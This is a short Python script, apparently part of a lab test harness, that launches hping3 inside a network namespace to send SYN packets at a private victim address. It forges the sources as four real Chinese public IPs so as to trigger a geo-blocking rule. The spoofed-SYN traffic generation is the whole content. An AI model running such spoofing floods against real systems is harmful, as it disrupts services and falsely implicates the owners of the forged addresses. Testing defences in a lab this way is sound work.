#!/usr/bin/env python3
# ==============================================================================
# Script: geo_spoof.py
# Mục đích: Bắn 4 IP từ Trung Quốc (CN) để kích hoạt Geo Heuristic BlockCountry
# Cách hoạt động: Gọi hping3 qua subprocess trong namespace ns_100
# ==============================================================================

import subprocess
import time
import os

VICTIM_IP = "10.10.2.2"

# 4 IP tĩnh cứng đại diện cho 4 /24 CIDR của Trung Quốc (CN)
# Bạn có thể lấy 4 IP bất kỳ miễn là nó nằm trong dải bị coi là TQ trong file mmdb của bạn.
CN_IPS = [
    "114.114.114.114", # Jiangsu, CN
    "220.181.38.148",  # Baidu, CN
    "119.29.29.29",    # Tencent, CN
    "180.76.76.76"     # Baidu, CN
]

procs = []

print(f"[*] Bắt đầu Geo Spoofing đập vào {VICTIM_IP} từ ns_100...")

for ip in CN_IPS:
    # Lệnh: ip netns exec ns_100 hping3 -S -p 80 -i u10000 -a <fake_ip> 10.10.2.2
    # Bắn nhẹ (100pps) để mồi câu
    cmd = ["ip", "netns", "exec", "ns_100", "hping3", "-S", "-p", "80", "-i", "u10000", "-a", ip, VICTIM_IP]
    p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    procs.append(p)
    print(f" [+] Spawned hping3 spoofing as {ip} (PID: {p.pid})")

# Viết PID ra file để bash script đọc kill
with open("/tmp/geo_spoof.pids", "w") as f:
    for p in procs:
        f.write(f"{p.pid}\n")
        
print("[*] Đang chạy ngầm... Thoát chương trình Python.")
